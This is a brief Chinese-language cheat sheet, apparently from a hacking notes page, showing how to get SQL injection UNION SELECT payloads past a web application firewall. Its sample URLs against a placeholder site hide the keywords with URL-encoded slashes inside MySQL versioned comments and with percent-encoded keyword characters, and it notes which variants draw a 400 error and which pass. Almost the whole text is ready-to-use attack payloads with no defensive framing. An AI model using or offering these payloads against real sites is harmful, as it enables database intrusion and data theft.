URL编码的反斜杠/

%2f 来代替 /

           
http://www.site.com/php?id=2%2f*!50000uNIOn*%2f-- - (no waf)   http://www.site.com/php?id=2%2f*!50000uNIOn*%2f %2f*!50000SeLeCt*%2f -- - (no waf)

http://www.site.com/php?id=2%2f*!50000uNIOn*%2f %2f*!50000SeLeCt*%2f 1,2,3,4,5-- - 

就这样直接过了

使用url encoding关键词来bypass waf

http://www.site.com/php?id=2 uNiOn-- - [400 bad request]


http://www.site.com/php?id=2 %75%6e%69%6f%6e-- -[no waf]

http://www.site.com/php?id=2 %75%6e%69%6f%6e %73%65%6c%65%63%74%20 1,2,3,4,5-- -
在这里 %75%6e%69%6f%6e 代替union， %73%65%6c%65%63%74%20 来代替 select
